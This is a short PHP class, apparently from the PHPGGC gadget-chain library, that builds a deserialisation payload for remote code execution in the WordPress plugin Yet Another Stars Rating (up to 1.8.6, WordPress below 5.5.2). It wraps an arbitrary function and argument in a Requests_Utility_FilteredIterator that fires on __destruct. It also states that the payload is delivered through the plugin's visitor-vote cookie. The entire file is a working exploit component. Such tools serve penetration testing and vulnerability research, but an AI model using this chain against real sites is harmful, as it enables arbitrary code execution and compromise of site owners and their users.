<?php

namespace GadgetChain\WordPress\P\YetAnotherStarsRating;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '? <= 1.8.6 & WP < 5.5.2';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    public static $information = 'Payload has to be in the COOKIE yasr_visitor_vote_cookie in a page containing the shortcode of the plugin allowing visitor ratings';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Requests_Utility_FilteredIterator([$parameter], $function);
    }
}